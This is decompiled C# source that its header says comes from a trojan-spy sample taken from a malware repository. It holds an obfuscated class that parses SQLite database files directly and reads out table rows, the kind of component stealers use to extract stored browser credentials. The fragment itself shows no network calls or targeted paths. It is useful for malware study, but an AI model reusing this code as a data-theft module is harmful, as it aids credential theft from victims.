// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.trPERVYHte
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using System;
using System.IO;
using System.Text;

namespace AlphaCentavr
{
  internal class trPERVYHte
  {
    private readonly byte[] _sqlDataTypeSize = new byte[10]
    {
      (byte) 0,
      (byte) 1,
      (byte) 2,
      (byte) 3,
      (byte) 4,
      (byte) 6,
      (byte) 8,
      (byte) 8,
      (byte) 0,
      (byte) 0
    };
    private readonly ulong _dbEncoding;
    private readonly byte[] _fileBytes;
    private readonly ulong _pageSize;
    private string[] _fieldNames;
    private trPERVYHte.SqliteMasterEntry[] _masterTableEntries;
    private trPERVYHte.TableEntry[] _tableEntries;

    public trPERVYHte(string cccccc)
    {
      this._fileBytes = File.ReadAllBytes(cccccc);
      this._pageSize = this.ConvertToULong(16, 2);
      this._dbEncoding = this.ConvertToULong(56, 4);
      this.ReadMasterTable(100L);
    }

    public string GetValue(int rowNum, int field)
    {
      try
      {
        return rowNum >= this._tableEntries.Length ? (string) null : (field >= this._tableEntries[rowNum].Content.Length ? (string) null : this._tableEntries[rowNum].Content[field]);
      }
      catch
      {
        return "";
      }
    }

    public int GetRowCount() => this._tableEntries.Length;

    private bool ReadTableFromOffset(ulong offset)
    {
      try
      {
        if (this._fileBytes[offset] == (byte) 13)
        {
          uint num1 = checked ((uint) (this.ConvertToULong((int) offset + 3, 2) - 1UL));
          int num2 = 0;
          if (this._tableEntries != null)
          {
            num2 = this._tableEntries.Length;
            Array.Resize<trPERVYHte.TableEntry>(ref this._tableEntries, checked (this._tableEntries.Length + (int) num1 + 1));
          }
          else
            this._tableEntries = new trPERVYHte.TableEntry[checked ((int) num1 + 1)];
          uint num3 = 0;
          while (checked ((int) num3) <= checked ((int) num1))
          {
            ulong startIdx1 = this.ConvertToULong(checked ((int) offset + 8 + (int) num3 * 2), 2);
            if (checked ((long) offset) != 100L)
              checked { startIdx1 += offset; }
            int endIdx1 = this.Gvl(checked ((int) startIdx1));
            this.Cvl(checked ((int) startIdx1), endIdx1);
            int endIdx2 = this.Gvl(checked ((int) ((long) startIdx1 + ((long) endIdx1 - (long) startIdx1) + 1L)));
            this.Cvl(checked ((int) ((long) startIdx1 + ((long) endIdx1 - (long) startIdx1) + 1L)), endIdx2);
            ulong startIdx2 = checked (startIdx1 + (ulong) ((long) endIdx2 - (long) startIdx1 + 1L));
            int endIdx3 = this.Gvl(checked ((int) startIdx2));
            int endIdx4 = endIdx3;
            long num4 = this.Cvl(checked ((int) startIdx2), endIdx3);
            trPERVYHte.RecordHeaderField[] array = (trPERVYHte.RecordHeaderField[]) null;
            long num5 = checked ((long) startIdx2 - (long) endIdx3 + 1L);
            int index1 = 0;
            while (num5 < num4)
            {
              Array.Resize<trPERVYHte.RecordHeaderField>(ref array, checked (index1 + 1));
              int startIdx3 = checked (endIdx4 + 1);
              endIdx4 = this.Gvl(startIdx3);
              array[index1].Type = this.Cvl(startIdx3, endIdx4);
              array[index1].Size = array[index1].Type <= 9L ? (long) this._sqlDataTypeSize[array[index1].Type] : (!trPERVYHte.IsOdd(array[index1].Type) ? checked (array[index1].Type - 12L) / 2L : checked (array[index1].Type - 13L) / 2L);
              num5 = checked (num5 + (long) (endIdx4 - startIdx3) + 1L);
              checked { ++index1; }
            }
            if (array != null)
            {
              this._tableEntries[checked (num2 + (int) num3)].Content = new string[array.Length];
              int num6 = 0;
              int index2 = 0;
              while (index2 <= checked (array.Length - 1))
              {
                if (array[index2].Type > 9L)
                {
                  if (!trPERVYHte.IsOdd(array[index2].Type))
                  {
                    if (checked ((long) this._dbEncoding) == 1L)
                      this._tableEntries[checked (num2 + (int) num3)].Content[index2] = Encoding.Default.GetString(this._fileBytes, checked ((int) ((long) startIdx2 + num4 + (long) num6)), checked ((int) array[index2].Size));
                    else if (checked ((long) this._dbEncoding) == 2L)
                      this._tableEntries[checked (num2 + (int) num3)].Content[index2] = Encoding.Unicode.GetString(this._fileBytes, checked ((int) ((long) startIdx2 + num4 + (long) num6)), checked ((int) array[index2].Size));
                    else if (checked ((long) this._dbEncoding) == 3L)
                      this._tableEntries[checked (num2 + (int) num3)].Content[index2] = Encoding.BigEndianUnicode.GetString(this._fileBytes, checked ((int) ((long) startIdx2 + num4 + (long) num6)), checked ((int) array[index2].Size));
                  }
                  else
                    this._tableEntries[checked (num2 + (int) num3)].Content[index2] = Encoding.Default.GetString(this._fileBytes, checked ((int) ((long) startIdx2 + num4 + (long) num6)), checked ((int) array[index2].Size));
                }
                else
                  this._tableEntries[checked (num2 + (int) num3)].Content[index2] = Convert.ToString(this.ConvertToULong(checked ((int) ((long) startIdx2 + num4 + (long) num6)), checked ((int) array[index2].Size)));
                checked { num6 += (int) array[index2].Size; }
                checked { ++index2; }
              }
            }
            checked { ++num3; }
          }
        }
        else if (this._fileBytes[offset] == (byte) 5)
        {
          uint num7 = checked ((uint) (this.ConvertToULong((int) ((long) offset + 3L), 2) - 1UL));
          uint num8 = 0;
          while (checked ((int) num8) <= checked ((int) num7))
          {
            uint num9 = checked ((uint) this.ConvertToULong((int) offset + 12 + (int) num8 * 2, 2));
            this.ReadTableFromOffset(checked (this.ConvertToULong((int) ((long) offset + (long) num9), 4) - 1UL * this._pageSize));
            checked { ++num8; }
          }
          this.ReadTableFromOffset(checked (this.ConvertToULong((int) ((long) offset + 8L), 4) - 1UL * this._pageSize));
        }
        return true;
      }
      catch
      {
        return false;
      }
    }

    private void ReadMasterTable(long offset)
    {
      try
      {
        switch (this._fileBytes[offset])
        {
          case 5:
            uint num1 = checked ((uint) (this.ConvertToULong((int) offset + 3, 2) - 1UL));
            int num2 = 0;
            while (num2 <= checked ((int) num1))
            {
              uint startIndex = checked ((uint) this.ConvertToULong((int) offset + 12 + num2 * 2, 2));
              if (offset == 100L)
                this.ReadMasterTable(checked ((long) this.ConvertToULong((int) startIndex, 4) - 1L * (long) this._pageSize));
              else
                this.ReadMasterTable(checked ((long) this.ConvertToULong((int) (offset + (long) startIndex), 4) - 1L * (long) this._pageSize));
              checked { ++num2; }
            }
            this.ReadMasterTable(checked ((long) this.ConvertToULong((int) offset + 8, 4) - 1L * (long) this._pageSize));
            break;
          case 13:
            ulong num3 = checked (this.ConvertToULong((int) offset + 3, 2) - 1UL);
            int num4 = 0;
            if (this._masterTableEntries != null)
            {
              num4 = this._masterTableEntries.Length;
              Array.Resize<trPERVYHte.SqliteMasterEntry>(ref this._masterTableEntries, checked (this._masterTableEntries.Length + (int) num3 + 1));
            }
            else
              this._masterTableEntries = new trPERVYHte.SqliteMasterEntry[checked ((ulong) unchecked ((long) num3 + 1L))];
            ulong num5 = 0;
            while (num5 <= num3)
            {
              ulong startIdx1 = this.ConvertToULong(checked ((int) offset + 8 + (int) num5 * 2), 2);
              if (offset != 100L)
                checked { startIdx1 += (ulong) offset; }
              int endIdx1 = this.Gvl(checked ((int) startIdx1));
              this.Cvl(checked ((int) startIdx1), endIdx1);
              int endIdx2 = this.Gvl(checked ((int) ((long) startIdx1 + ((long) endIdx1 - (long) startIdx1) + 1L)));
              this.Cvl(checked ((int) ((long) startIdx1 + ((long) endIdx1 - (long) startIdx1) + 1L)), endIdx2);
              ulong startIdx2 = checked (startIdx1 + (ulong) ((long) endIdx2 - (long) startIdx1 + 1L));
              int endIdx3 = this.Gvl(checked ((int) startIdx2));
              int endIdx4 = endIdx3;
              long num6 = this.Cvl(checked ((int) startIdx2), endIdx3);
              long[] numArray = new long[5];
              int index = 0;
              while (index <= 4)
              {
                int startIdx3 = checked (endIdx4 + 1);
                endIdx4 = this.Gvl(startIdx3);
                numArray[index] = this.Cvl(startIdx3, endIdx4);
                numArray[index] = numArray[index] <= 9L ? (long) this._sqlDataTypeSize[numArray[index]] : (!trPERVYHte.IsOdd(numArray[index]) ? checked (numArray[index] - 12L) / 2L : checked (numArray[index] - 13L) / 2L);
                checked { ++index; }
              }
              if (checked ((long) this._dbEncoding) == 1L || checked ((long) this._dbEncoding) == 2L)
              {
                if (checked ((long) this._dbEncoding) == 1L)
                  this._masterTableEntries[checked (num4 + (int) num5)].ItemName = Encoding.Default.GetString(this._fileBytes, checked ((int) ((long) startIdx2 + num6 + numArray[0])), checked ((int) numArray[1]));
                else if (checked ((long) this._dbEncoding) == 2L)
                  this._masterTableEntries[checked (num4 + (int) num5)].ItemName = Encoding.Unicode.GetString(this._fileBytes, checked ((int) ((long) startIdx2 + num6 + numArray[0])), checked ((int) numArray[1]));
                else if (checked ((long) this._dbEncoding) == 3L)
                  this._masterTableEntries[checked (num4 + (int) num5)].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, checked ((int) ((long) startIdx2 + num6 + numArray[0])), checked ((int) numArray[1]));
              }
              this._masterTableEntries[checked (num4 + (int) num5)].RootNum = checked ((long) this.ConvertToULong((int) ((long) startIdx2 + num6 + numArray[0] + numArray[1] + numArray[2]), (int) numArray[3]));
              if (checked ((long) this._dbEncoding) == 1L)
                this._masterTableEntries[checked (num4 + (int) num5)].SqlStatement = Encoding.Default.GetString(this._fileBytes, checked ((int) ((long) startIdx2 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3])), checked ((int) numArray[4]));
              else if (checked ((long) this._dbEncoding) == 2L)
                this._masterTableEntries[checked (num4 + (int) num5)].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, checked ((int) ((long) startIdx2 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3])), checked ((int) numArray[4]));
              else if (checked ((long) this._dbEncoding) == 3L)
                this._masterTableEntries[checked (num4 + (int) num5)].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, checked ((int) ((long) startIdx2 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3])), checked ((int) numArray[4]));
              checked { ++num5; }
            }
            break;
        }
      }
      catch
      {
      }
    }

    public bool ReadTable(string tableName)
    {
      try
      {
        int index1 = -1;
        int index2 = 0;
        while (index2 <= this._masterTableEntries.Length)
        {
          if (string.Compare(this._masterTableEntries[index2].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
          {
            index1 = index2;
            break;
          }
          checked { ++index2; }
        }
        if (index1 == -1)
          return false;
        string[] strArray = this._masterTableEntries[index1].SqlStatement.Substring(checked (this._masterTableEntries[index1].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1)).Split(',');
        int index3 = 0;
        while (index3 <= checked (strArray.Length - 1))
        {
          strArray[index3] = strArray[index3].TrimStart();
          int length = strArray[index3].IndexOf(' ');
          if (length > 0)
            strArray[index3] = strArray[index3].Substring(0, length);
          if (strArray[index3].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
          {
            Array.Resize<string>(ref this._fieldNames, checked (index3 + 1));
            this._fieldNames[index3] = strArray[index3];
          }
          checked { ++index3; }
        }
        return this.ReadTableFromOffset(checked ((ulong) (this._masterTableEntries[index1].RootNum - 1L) * this._pageSize));
      }
      catch
      {
        return false;
      }
    }

    private ulong ConvertToULong(int startIndex, int size)
    {
      try
      {
        if (size > 8 | size == 0)
          return 0;
        ulong num1 = 0;
        int num2 = 0;
        while (num2 <= checked (size - 1))
        {
          num1 = num1 << 8 | (ulong) this._fileBytes[checked (startIndex + num2)];
          checked { ++num2; }
        }
        return num1;
      }
      catch
      {
        return 0;
      }
    }

    private int Gvl(int startIdx)
    {
      try
      {
        if (startIdx > this._fileBytes.Length)
          return 0;
        int index = startIdx;
        while (index <= checked (startIdx + 8))
        {
          if (index > checked (this._fileBytes.Length - 1))
            return 0;
          if (((int) this._fileBytes[index] & 128) != 128)
            return index;
          checked { ++index; }
        }
        return checked (startIdx + 8);
      }
      catch
      {
        return 0;
      }
    }

    private long Cvl(int startIdx, int endIdx)
    {
      try
      {
        checked { ++endIdx; }
        byte[] numArray = new byte[8];
        int num1 = checked (endIdx - startIdx);
        bool flag = false;
        if (num1 == 0 | num1 > 9)
          return 0;
        switch (num1)
        {
          case 1:
            numArray[0] = checked ((byte) ((int) this._fileBytes[startIdx] & (int) sbyte.MaxValue));
            return BitConverter.ToInt64(numArray, 0);
          case 9:
            flag = true;
            break;
        }
        int num2 = 1;
        int num3 = 7;
        int index1 = 0;
        if (flag)
        {
          numArray[0] = this._fileBytes[checked (endIdx - 1)];
          checked { --endIdx; }
          index1 = 1;
        }
        int index2 = checked (endIdx - 1);
        while (index2 >= startIdx)
        {
          if (checked (index2 - 1) >= startIdx)
          {
            numArray[index1] = checked ((byte) ((int) this._fileBytes[index2] >> num2 - 1 & (int) byte.MaxValue >> num2 | (int) this._fileBytes[index2 - 1] << num3));
            checked { ++num2; }
            checked { ++index1; }
            checked { --num3; }
          }
          else if (!flag)
            numArray[index1] = checked ((byte) ((int) this._fileBytes[index2] >> num2 - 1 & (int) byte.MaxValue >> num2));
          checked { index2 += -1; }
        }
        return BitConverter.ToInt64(numArray, 0);
      }
      catch
      {
        return 0;
      }
    }

    private static bool IsOdd(long value) => (value & 1L) == 1L;

    private struct RecordHeaderField
    {
      public long Size;
      public long Type;
    }

    private struct TableEntry
    {
      public string[] Content;
    }

    private struct SqliteMasterEntry
    {
      public string ItemName;
      public long RootNum;
      public string SqlStatement;
    }
  }
}
